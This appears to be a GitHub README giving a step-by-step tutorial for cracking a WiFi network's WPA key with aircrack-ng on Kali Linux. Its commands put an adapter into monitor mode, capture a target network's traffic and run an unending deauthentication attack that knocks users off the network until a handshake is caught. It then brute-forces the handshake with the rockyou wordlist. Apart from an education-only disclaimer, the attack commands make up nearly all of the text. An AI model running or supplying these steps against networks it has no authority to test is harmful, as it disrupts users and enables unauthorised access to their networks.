
# Password Cracking using aircrack-ng

These are the steps to be followed to Crack WIFI Key Using Kali Linux

Terminal Commands:

    sudo su
     airmon-ng check kill
     airmon-ng start wlan0
     airodump-ng wlan0mon

<img src="https://user-images.githubusercontent.com/103558082/235841983-11d9990a-a9d2-45fa-8f3f-fd0c140b738d.png">
<img src="https://user-images.githubusercontent.com/103558082/235842012-21987a57-e498-40f9-93d7-d6f4b5f2adb4.png">

In new terminal:

    sudo su
     cd Desktop
     airodump-ng wlan0mon --bssid (target Bssid) -c (Target Channel Number) -w (hand_shake file name)

After running the above command there will be certain .csv and .cap files created based on the (hand_shake file name) name specified.

<img src="https://user-images.githubusercontent.com/103558082/235842315-384ce725-cbed-4a4f-a321-c7e3e1ecccd4.png">
<img src="https://user-images.githubusercontent.com/103558082/235842319-ddfe5f7d-5351-46de-bf20-f35a106237e4.png">

For Deauthentication attack open new terminal:

    aireplay-ng --deauth 0 -a (Target Bssid) wlan0mon 

Run the Deauthentication attack till you get a WPA Handshake

<img src="https://user-images.githubusercontent.com/103558082/235842462-6ec05fb6-9876-49be-af70-8da245d4c226.png">

For getting the (wordlist name) i.e rockyou.txt file go to :

    /usr/share/wordlists  
extract the rockyou.txt file to Desktop.

For cracking Handshake open new terminal:

    sudo su
     cd Desktop
     aircrack-ng -w (wordlist name) (hanshake cap file name)

<img src="https://user-images.githubusercontent.com/103558082/235842451-53454002-f041-4f01-b3ba-b670df50a801.png">
<img src="https://user-images.githubusercontent.com/103558082/235842456-450370ca-5da0-4724-8471-0b929d8bdc4b.png">
<img src="https://user-images.githubusercontent.com/103558082/235842459-99b419ca-cb78-431e-b789-21a3a55458ec.png">

## Disclaimer

ANY ILLEGAL USE OF ANY LEARNT TECHNIQUE
WILL BE SOLELY THE ACTION OF THAT INDIVIDUAL.
THIS IS MERELY FOR EDUCATION PURPOSES AND THESE COMMAND ARE RUN ON SAMPLE WIFI NETWORK.
